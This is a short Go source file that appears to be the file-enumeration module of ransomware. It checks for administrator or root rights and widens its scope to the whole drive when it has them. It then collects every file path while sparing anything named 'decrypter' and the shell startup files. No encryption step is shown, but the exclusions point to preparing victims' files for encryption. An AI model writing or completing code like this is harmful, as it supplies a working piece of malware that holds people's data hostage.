package explorer

import (
	"fmt"
	"io/fs"
	"log"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"strings"
)

func isAuthority() bool {
	_, err := os.Open("\\\\.\\PHYSICALDRIVE0")
	if err != nil {
		return false
	}
	return true
}

func isRoot() bool {
	currentUser, err := user.Current()
	if err != nil {
		log.Fatalf("[isRoot] Unable to get current user: %s", err)
	}
	return currentUser.Username == "root"
}

func MapFiles() []string {
	var files []string
	var root string

	if runtime.GOOS == "windows" {
		root = os.Getenv("USERPROFILE")
		if isAuthority() {
			root = "C:\\"
		}
	} else {
		root = os.Getenv("HOME")
		if isRoot() {
			root = "/"
		} else {
			root += "/"
		}
	}

	error := filepath.WalkDir(root, func(path string, entry fs.DirEntry, err error) error {
		if err != nil {
			return err
		}

		if strings.Contains(path, "decrypter") || strings.Contains(path, ".bashrc") || strings.Contains(path, ".zshrc") || strings.Contains(path, ".profile") || strings.Contains(path, "bash") || strings.Contains(path, "sh") || strings.Contains(path, "zsh") {
			return nil
		} else {
			files = append(files, path)
			return nil
		}
	})

	if error != nil {
		fmt.Println(error)
	}

	return files
}
